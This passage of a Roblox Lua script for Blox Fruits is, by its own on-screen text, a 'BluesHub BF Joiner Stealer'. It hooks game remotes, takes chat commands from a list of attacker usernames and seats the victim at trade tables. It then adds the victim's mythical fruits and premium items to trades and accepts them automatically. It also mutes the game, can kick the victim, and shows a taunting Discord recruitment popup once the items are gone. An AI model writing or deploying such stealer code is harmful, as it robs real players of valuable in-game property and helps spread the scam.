    local seatWeldAdded = seat.ChildAdded:Connect(function(child)
        if child.Name == "SeatWeld" then success = true end
    end)
    
    task.delay(3, function() seatWeldAdded:Disconnect() end)
    return success
end

local function splitFruitsIntoTrades(fruits)
    local trades, currentIndex = {}, 1
    local totalFruits = #fruits
    
    if totalFruits <= 4 then
        for i = 1, totalFruits do
            trades[i] = {fruits[i]}
        end
        return trades
    end

    local numTrades = math.ceil(totalFruits / 4)
    local baseFruitsPerTrade = math.floor(totalFruits / numTrades)
    local extraFruits = totalFruits % numTrades
    
    for trade = 1, numTrades do
        local fruitsThisTrade = baseFruitsPerTrade + (extraFruits > 0 and 1 or 0)
        extraFruits = extraFruits - (extraFruits > 0 and 1 or 0)
        
        local currentTrade = table.create(fruitsThisTrade)
        for i = 1, fruitsThisTrade do
            if currentIndex <= totalFruits then
                currentTrade[i] = fruits[currentIndex]
                currentIndex = currentIndex + 1
            end
        end
        
        if #currentTrade > 0 then
            trades[#trades + 1] = currentTrade
        end
    end
    
    return trades
end
local DefaultChatSystem = ReplicatedStorage.DefaultChatSystemChatEvents

local function sendTradeMessage(fruits, tradeNumber, totalTrades)
    if #fruits == 0 then return end
    
    local function formatFruitList(fruits)
        local formatted = table.create(#fruits)
        for i, fruit in ipairs(fruits) do
            formatted[i] = fruit:gsub("-", " ")
        end
        return table.concat(formatted, ", ")
    end
    
    if tradeNumber == 1 and totalTrades > 1 then
        DefaultChatSystem.SayMessageRequest:FireServer("Hey! Let's do multiple trades for multiple fruits!", "All")
        task.wait(1)
    end

    local message = #fruits == 1 
        and string.format("Trade %d/%d - Adding %s", tradeNumber, totalTrades, formatFruitList(fruits))
        or string.format("Trade %d/%d - Adding %d fruits: %s", tradeNumber, totalTrades, #fruits, formatFruitList(fruits))
    
    DefaultChatSystem.SayMessageRequest:FireServer(message, "All")
end

local function checkInventoryForFruit(fruitName)
    local inventory = getInventory()
    if not inventory then return 0 end
    
    local fruitCount = 0
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name == fruitName then
            fruitCount = fruitCount + 1
        end
    end
    
    return fruitCount
end

local function wasTradeSuccessful(fruit)
    local beforeCount = checkInventoryForFruit(fruit)
    task.wait(2)
    return checkInventoryForFruit(fruit) < beforeCount
end

local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if not (tradeUI and tradeUI:FindFirstChild("Trade")) then return end
    
    local container = tradeUI.Trade:WaitForChild("Container")
    local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
    
    for _, item in ipairs(playerItems) do
        if item:IsA("ImageButton") then
            TradeFunction:InvokeServer("removeItem", item.Name)
            task.wait(0.5)
        end
    end
end

local function addFruitToTrade(fruit)
    for _ = 1, 5 do
        if not isInTradeWithCorrectPlayer() then return false end
        
        clearTradeItems()
        task.wait(0.5)
        
        TradeFunction:InvokeServer("addItem", fruit)
        task.wait(1.5)

        local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
        if not (tradeUI and tradeUI:FindFirstChild("Trade")) then continue end
        
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        local fruitCount, correctFruitFound = 0, false
        
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                fruitCount = fruitCount + 1
                if item.Name == fruit then
                    correctFruitFound = true
                else
                    clearTradeItems()
                end
            end
        end

        if fruitCount == 1 and correctFruitFound then return true end
        task.wait(1)
    end
    return false
end

local function acceptTrade()
    TradeFunction:InvokeServer("accept")
end

local function findTradeTable()
    local tradeTables = Sea3 and workspace.Map.Turtle:GetChildren() or workspace.Map.Dressrosa:GetChildren()
    for _, table in ipairs(tradeTables) do
        local p1 = table:FindFirstChild("P1")
        local p2 = table:FindFirstChild("P2")
        
        if table.Name == "TradeTable" and p1 and p2 and not p1:FindFirstChild("SeatWeld") and not p2:FindFirstChild("SeatWeld") then
            return table 
        end
    end
end

local function createDiscordUI()
    local CoreGui = game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteUI"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 9999
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 800, 0, 150)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
    
    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "Read Below!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.Parent = MainFrame
    
    local Description = Instance.new("TextLabel")
    Description.Name = "Description"
    Description.Size = UDim2.new(0.9, 0, 0, 40)
    Description.Position = UDim2.new(0.05, 0, 0.3, 0)
    Description.BackgroundTransparency = 1
    Description.Font = Enum.Font.Gotham
    Description.Text = "Hey! You just lost some of your valuable fruits to BluesHub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
    Description.TextColor3 = Color3.fromRGB(220, 221, 222)
    Description.TextScaled = true
    Description.TextWrapped = true
    Description.Parent = MainFrame
    
    local Button = Instance.new("TextButton")
    Button.Name = "CopyButton"
    Button.Size = UDim2.new(0.7, 0, 0, 36)
    Button.Position = UDim2.new(0.15, 0, 0.7, 0)
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    Button.Font = Enum.Font.GothamBold
    Button.Text = "Copy Invite"
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextScaled = true
    Button.AutoButtonColor = false
    Button.Parent = MainFrame
    
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)
    
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function createTween(instance, props)
        return TweenService:Create(instance, fadeInfo, props)
    end
    
    MainFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Description.TextTransparency = 1
    Button.BackgroundTransparency = 1
    Button.TextTransparency = 1
    
    task.wait(0.1)
    createTween(MainFrame, {BackgroundTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Title, {TextTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Description, {TextTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    Button.MouseEnter:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
    end)
    
    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/")
        Button.Text = "Copied!"
        task.delay(2, function() Button.Text = "Copy Invite" end)
    end)
    
    ScreenGui.Parent = CoreGui
    return ScreenGui
end

local mythicalFruits = {
    "Gravity-Gravity",
    "Mammonth-Mammonth",
    "T-Rex-T-Rex",
    "Dough-Dough",
    "Shadow-Shadow",
    "Venom-Venom",
    "Control-Control",
    "Gas-Gas",
    "Spirit-Spirit",
    "Leopard-Leopard",
    "Yeti-Yeti",
    "Kitsune-Kitsune",
    "Dragon(East)-Dragon(East)",
    "Dragon(West)-Dragon(West)",
    "Meme-Meme",
}

local ChatCommands = {
    prefix = "?",
    lastExecutionTime = {},
    cooldowns = {
        default = 0.1,
        invite = 0.25,
        addfruits = 0.25,
        addfruit = 0.25,
        addallfruits = 0.25,
        clearfruits = 0.25,
        additem = 0.25,
        addallitems = 0.25,
        sit = 0.5,
        sit2 = 0.5,
        resetfruit = 3,
        tp = 0.25,
        stopreset = 0.5,
        showinv = 1,
    },

    commands = {
        jump = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                task.spawn(forceJump)
            end
        end,

        invite = function()
            createDiscordUI()
        end,
        
        sit = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if not tradeTable then return end
                for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
                    if seat and isSeatAvailable(seat) then
                        sitAtSeat(seat)
                        break
                    end
                end
            end)
        end,
        
        reset = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end
        end,

        resetfruit = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?resetfruit FruitName", "All")
                    return
                end
        
                local inventory = getInventory()
                if not inventory then return end
                local searchTerm = args:lower()
                local foundFruit = false
                local fruitName = nil
                
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        fruitName = item.Name
                        foundFruit = true
                        break
                    end
                end
                
                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                    return
                end
        
                local baseFruitName = fruitName:match("(%S+)")
                local formattedFruitName = string.format("%s", baseFruitName)
        
                local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
                Remote:InvokeServer("LoadFruit", formattedFruitName)
            
                task.wait(0.5)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                end
        
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Reseted with " .. baseFruitName .. "", "All")
            end)
        end, 

        addallitems = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                
                local inventory = getInventory()
                if not inventory then return end
                
                local premiumItems = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Premium" then
                        table.insert(premiumItems, item.Name)
                    end
                end

                local addedItems = {}
                local attempts = 0
                local maxAttempts = 50
                local targetItems = math.min(4, #premiumItems)
                
                while #addedItems < targetItems and attempts < maxAttempts do
                    local availableItems = {}
                    for _, item in ipairs(premiumItems) do
                        if not addedItems[item] then
                            table.insert(availableItems, item)
                        end
                    end
                    
                    if #availableItems == 0 then break end

                    local randomIndex = math.random(1, #availableItems)
                    local selectedItem = availableItems[randomIndex]
                    
                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", selectedItem)
                    task.wait(0.05)
                    
                    local container = tradeUI.Trade:FindFirstChild("Container")
                    if container then
                        local playerFrame = container:FindFirstChild("1")
                        if playerFrame then
                            local itemFrame = playerFrame:FindFirstChild("Frame")
                            if itemFrame and itemFrame:FindFirstChild(selectedItem) then
                                addedItems[selectedItem] = true
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                    "Added " .. selectedItem:gsub("-", " ") .. " to trade!", "All")
                            end
                        end
                    end
                    
                    attempts = attempts + 1
                end

                local totalAdded = 0
                for _ in pairs(addedItems) do totalAdded = totalAdded + 1 end
                
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Successfully added " .. totalAdded .. " premium items to trade!", "All")
            end)
        end,

        showinv = function()
            task.spawn(function()
                local inventory = getInventory()
                if not inventory then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Error getting inventory.", "All")
                    return
                end
        
                local fruitCounts = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        local simpleName = item.Name:match("^([^-]+)")
                        fruitCounts[simpleName] = (fruitCounts[simpleName] or 0) + item.Count
                    end
                end
        
                if not next(fruitCounts) then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Inventory is empty of fruits.", "All")
                    return
                end
        
                local chatEvent = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                local messageChunks = {}
                local currentChunk = ""
                local fruitList = {}
                for fruitName, count in pairs(fruitCounts) do
                    local displayText = fruitName
                    if count > 1 then
                        displayText = displayText .. " (x" .. count .. ")"
                    end
                    table.insert(fruitList, displayText)
                end
                
                local message = table.concat(fruitList, ", ")
                
                while #message > 0 do
                    local chunk = message:sub(1, 128)
                    local lastComma = chunk:find(",[^,]*$")
                    
                    if #message > 128 and lastComma then
                        chunk = message:sub(1, lastComma - 1)
                        message = message:sub(lastComma + 2)
                    else
                        message = message:sub(#chunk + 1)
                    end
                    
                    table.insert(messageChunks, chunk)
                end
                
                for _, chunk in ipairs(messageChunks) do
                    chatEvent:FireServer(chunk, "All")
                    task.wait(0.5)
                end
            end)
        end,

        sit2 = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if tradeTable then
                    tweenToPosition(tradeTable.P1.Position, 350)
                end
            end)
        end,

        accept = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                acceptTrade()
            end)
        end,

        cleartrade = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                clearTradeItems()
            end)
        end,

        addallfruits = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                
                local inventory = getInventory()
                if not inventory then return end
                
                local addedFruits = {}
                for _, fruit in ipairs(FruitsToHit) do
                    for _, item in pairs(inventory) do
                        if item.Type == "Blox Fruit" and item.Name == fruit and not addedFruits[fruit] then
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", fruit)
                            addedFruits[fruit] = true
                            task.wait(0.05)
                            break
                        end
                    end
                end
            end)
        end,

        addfruit = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?addfruit FruitName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                
                local inventory = getInventory()
                if not inventory then return end
                
                local searchTerm = args:lower()
                local foundFruit = false
                
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundFruit = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end
                
                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        cleartrade = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                
                local container = tradeUI.Trade:FindFirstChild("Container")
                if not container then return end
                
                local playerFrame = container:FindFirstChild("1")
                if not playerFrame then return end
                
                local itemFrame = playerFrame:FindFirstChild("Frame")
                if not itemFrame then return end
                
                for _, item in ipairs(itemFrame:GetChildren()) do
                    if item:IsA("ImageButton") then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
                        task.wait(0.05)
                    end
                end
            end)
        end,

        kick = function()
            game.Players.LocalPlayer:Kick("Error while loading! Rejoin.")
        end,

tp = function()
    task.spawn(function()

        local Sea2 = game.PlaceId == 4442272183
        local Sea3 = game.PlaceId == 7449423635

        if Sea3 then
            local inventory = getInventory()
            local hasValkyrie = false

            for _, item in pairs(inventory) do
                if item.Name == "Valkyrie Helm" then
                    hasValkyrie = true
                    break
                end
            end

            if hasValkyrie then
                local args = {
                    [1] = "requestEntrance",
                    [2] = Vector3.new(-12471.33, 374.95, -7539.37)
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
                return
            end

            tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125))

        elseif Sea2 then
            tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125))
        end
    end)
end,

        stopreset = function()
            task.spawn(function()
                isResettingEnabled = false
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Stopped fruit resetting process!", "All")
            end)
        end,

        additem = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify an item name! Usage: ?additem ItemName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                
                local inventory = getInventory()
                if not inventory then return end
                
                local searchTerm = args:lower()
                local foundItem = false
                
                for _, item in pairs(inventory) do
                    if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundItem = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end
                
                if not foundItem then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No Premium item matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        rejoin = function()
           task.spawn(function()
                local ts = game:GetService("TeleportService")
                local p = game:GetService("Players").LocalPlayer
                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
            end)
        end,

        help = function()
            task.spawn(function()
                local commands = {
                    "Movement: ?jump, ?sit, ?sit2, ?reset, ?tp",
                    "Trade: ?accept, ?cleartrade, ?addallfruits, ?addfruit <name>, ?clearfruits, ?additem <name>, ?addallitems",
                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv"
                }
                for _, msg in ipairs(commands) do
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                    task.wait(0.1)
                end
            end)
        end
    }
}

local function isAuthorizedUser(player)
    return table.find(Usernames, player.Name) ~= nil
end

local function handleChatCommand(player, message)
    if not isAuthorizedUser(player) then return end
    if message:sub(1, 1) ~= ChatCommands.prefix then return end
    
    local commandAndArgs = message:sub(2):lower()
    local command = commandAndArgs:match("^(%S+)")
    local args = commandAndArgs:match("^%S+%s+(.+)$")
    
    if not ChatCommands.commands[command] then return end
    
    local currentTime = tick()
    local lastExecution = ChatCommands.lastExecutionTime[command] or 0
    local cooldown = ChatCommands.cooldowns[command] or ChatCommands.cooldowns.default
    
    if currentTime - lastExecution < cooldown then
        return
    end
    
    ChatCommands.lastExecutionTime[command] = currentTime
    task.spawn(function()
        local success, error = pcall(function()
            ChatCommands.commands[command](args)
        end)
        if not success then
            warn("error:", command, error)
        end
    end)
end

game:GetService("Players").PlayerChatted:Connect(function(chatType, player, message)
    handleChatCommand(player, message)
end)

for _, v in pairs(getgc(true)) do
    if typeof(v) == "function" and islclosure(v) then
        local info = debug.getinfo(v)
        if info.name == "FireServer" or info.name == "InvokeServer" then
            hookfunction(v, function(self, ...)
                local args = {...}
                if typeof(args[1]) == "string" then
                    local player = Players:GetPlayerFromCharacter(self.Parent)
                    if player then
                        handleChatCommand(player, args[1])
                    end
                end
                return v(self, ...)
            end)
        end
    end
end

local function monitorTradeStatus(character)
    if not character.Humanoid then return end
   
   task.spawn(function()
    local RunService = game:GetService("RunService")
    local player = game.Players.LocalPlayer
    local remotes = game.ReplicatedStorage:WaitForChild("Remotes")
    local tradeFunction = remotes:WaitForChild("TradeFunction")
    local UserInputService = game:GetService("UserInputService")
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not player.Character.Parent then
            return
        end
        
        if UserInputService.TouchEnabled then
            task.wait(0.1)
        end   
           
           if not isSeated() then return end
           
           local tradeUI = player.PlayerGui:FindFirstChild("Main")
           if not tradeUI or not tradeUI.Trade or not tradeUI.Trade.Visible then return end
           
           if not isInTradeWithCorrectPlayer() then
               task.wait(0.5)
               if isSeated() and not isInTradeWithCorrectPlayer() then
                   forceJump()
                   task.wait(1)
                   if isSeated() then
                       forceJump()
                   end
               end
               return
           end
           
           local function attemptAddFruit(fruit)
               clearTradeItems()
               task.wait(1)
               
               tradeFunction:InvokeServer("addItem", fruit)
               task.wait(1)
               
               local container = tradeUI.Trade.Container
               for _, item in ipairs(container["1"].Frame:GetChildren()) do
                   if item:IsA("ImageButton") and item.Name == fruit then
                       return true
                   end
               end
               return false
           end
           
           for _, fruit in pairs(FruitsToHit) do
               if not isSeated() then
                   task.wait(1)
                   if not isSeated() then break end
               end
               
               if not isInTradeWithCorrectPlayer() then break end
               
               if attemptAddFruit(fruit) then
                   local startTime = tick()
                   while isSeated() and tick() - startTime < 60 and isInTradeWithCorrectPlayer() do
                       acceptTrade()
                       task.wait(1)
                       
                       if not tradeUI.Trade.Visible then
                           task.wait(1)
                           break
                       end
                   end
                   task.wait(2)
                   break
               end
           end
       end)
   end)
end

local function isPlayerNearby(player)
    if not player or not player.Character or not LocalPlayer.Character then return false end
    return (player.Character:GetPrimaryPartCFrame().Position - LocalPlayer.Character:GetPrimaryPartCFrame().Position).Magnitude <= 20
end

local function removeFruitFromTrade(fruit)
    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", fruit)
    task.wait(0.1)
end

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                removeFruitFromTrade(item.Name)
            end
        end
    end
end

local function getCurrentTradeItems()
    local items = {}
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                table.insert(items, item.Name)
            end
        end
    end
    return items
end

local function tradeWithPlayer()
    if tick() - lastTradeTime < 1 then return false end
    
    handleFruitReset()
    
    local tradeTable = findTradeTable()
    if not tradeTable then
        local tweenPosition = Sea3 and 
            Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125) or 
            Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125)
        tweenToPosition(tweenPosition, 350)
        task.wait(0.5)
        tradeTable = findTradeTable()
        if not tradeTable then return false end
    end
    
    local function validateAndSit(seat)
        if not seat then return false end
        
        local seatWeld = seat:FindFirstChild("SeatWeld")
        if seatWeld then
            local occupant = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
            if occupant and not isValidTradePartner(occupant) then
                return false
            end
        end
        
        for _ = 1, 2 do
            if sitAtSeat(seat) and isSeated() then
                return true
            end
            task.wait(0.25)
        end
        return false
    end
    
    local mySeat
    for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
        if validateAndSit(seat) then
            mySeat = seat
            break
        end
    end
    
    if not mySeat then return false end
    
    local otherSeat = mySeat.Name == "P1" and tradeTable.P2 or tradeTable.P1
    local startTime = tick()
    local result = false
    
    local function checkTrade()
        if not isSeated() then
            task.wait(0.25)
            return not isSeated()
        end
        
        local seatWeld = otherSeat:FindFirstChild("SeatWeld")
        if not seatWeld then return false end
        
        local otherPlayer = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
        if not otherPlayer then return false end
        
        if not isInTradeWithCorrectPlayer() then
            task.wait(0.25)
            if isSeated() and not isInTradeWithCorrectPlayer() then
                forceJump()
            end
            return true
        end
        
        if isInTradeWithCorrectPlayer() and isPlayerNearby(otherPlayer) then
            lastTradeTime = tick()
            result = otherPlayer
            return true
        end
        
        return false
    end
    
    while tick() - startTime < 60 and not result do
        if checkTrade() then break end
        task.wait(0.1)
    end
    
    if isSeated() then
        error("wow")
        task.wait(0.5)
    end
    
    return result
end

LocalPlayer.CharacterAdded:Connect(function(character)
    monitorTradeStatus(character)
end)

if LocalPlayer.Character then
    monitorTradeStatus(LocalPlayer.Character)
end

local trades = splitFruitsIntoTrades(FruitsToHit)
local currentTradeIndex = 1
local tradeAttempts = {}

local function silenceGame()
    local UserGameSettings = UserSettings():GetService("UserGameSettings")
    UserGameSettings.MasterVolume = 0
end

silenceGame()

local function cleanupUI()
    for _, ui in ipairs(game:GetService("CoreGui"):GetChildren()) do
        if ui.Name == "VoidLoader" or ui.Name == "DiscordInviteUI" then
            ui:Destroy()
        end
    end
end

local function cleanup()
    cleanupUI()
    isRunning = false
    for _, connection in pairs(getconnections(RunService.Heartbeat)) do
        connection:Disconnect()
    end
    stars = {}
    webhookCache = {
        storage = {},
        current = nil,
        last = nil,
        lastUpdate = 0
    }
end

game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
    cleanup()
    _G.scriptExecuted = nil
end)

local currentTradeIndex = 1
local tradeAttempts = {}
local lastMessageTime = 0
local isRunning = true
local messageQueue = {}
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function sendTradeMessage(message)
    local currentTime = tick()
    if currentTime - lastMessageTime >= 1 then
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        lastMessageTime = currentTime
    end
end

local function handleTrade(tradingPlayer, remainingFruits)
    if not tradingPlayer or not isSeated() then return false end

    local tradeComplete = false
    tradeAttempts[currentTradeIndex] = (tradeAttempts[currentTradeIndex] or 0) + 1
    
    if #remainingFruits > 1 and tradeAttempts[currentTradeIndex] == 1 then
        sendTradeMessage("Hey! Let's do multiple trades for multiple fruits!")
        sendTradeMessage("Please, wait until I put in correct fruits.")
    end
    
    local tradeValid = true
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not isPlayerNearby(tradingPlayer) then
            tradeValid = false
            if isSeated() then forceJump() end
            connection:Disconnect()
        end
    end)

    clearTradeItems()
    task.wait(0.5)
    
    local currentFruit = remainingFruits[1]
    if currentFruit then
        sendTradeMessage(string.format("Trade %d/%d - Adding %s", 
            currentTradeIndex, math.ceil(#remainingFruits), 
            currentFruit:gsub("-", " ")))
        
        local fruitAdded = false
        for _ = 1, 3 do
            if addFruitToTrade(currentFruit) then
                fruitAdded = true
                break
            end
            task.wait(0.5)
        end
        
        if fruitAdded then
            task.wait(0.3)
            local currentItems = getCurrentTradeItems()
            for _, item in ipairs(currentItems) do
                if item ~= currentFruit then
                    removeFruitFromTrade(item)
                    fruitAdded = false
                    break
                end
            end
            
            if fruitAdded then
                local startTime = tick()
                while isSeated() and tradeValid and tick() - startTime < 60 do
                    acceptTrade()
                    task.wait(0.2)
                    
                    local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                    if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                        if wasTradeSuccessful(currentFruit) then
                            tradeComplete = true
                            break
                        end
                    end
                end
            end
        end
    end
    
    connection:Disconnect()
    
    if tradeComplete then
        currentTradeIndex = (currentTradeIndex >= math.ceil(#remainingFruits)) and 1 or currentTradeIndex + 1
        if currentTradeIndex == 1 then
            tradeAttempts = {}
        end
    end
    
    return tradeComplete
end

local lastHeartbeatCheck = 0
RunService.Heartbeat:Connect(function()
    if not isRunning then return end
    
    local currentTime = tick()
    if currentTime - lastHeartbeatCheck < 0.5 then return end
    lastHeartbeatCheck = currentTime
    
    local tradingPlayer = tradeWithPlayer()
    if not tradingPlayer then return end
    
    local remainingFruits = {}
    local inventory = getInventory()
    
    for i = currentTradeIndex, #trades do
        for _, fruit in ipairs(trades[i]) do
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" and item.Name == fruit then
                    table.insert(remainingFruits, fruit)
                    break
                end
            end
        end
    end
    
    if #remainingFruits == 0 then
        currentTradeIndex = 1
        tradeAttempts = {}
        trades = splitFruitsIntoTrades(FruitsToHit)
        return
    end
    
    handleTrade(tradingPlayer, remainingFruits)
end)
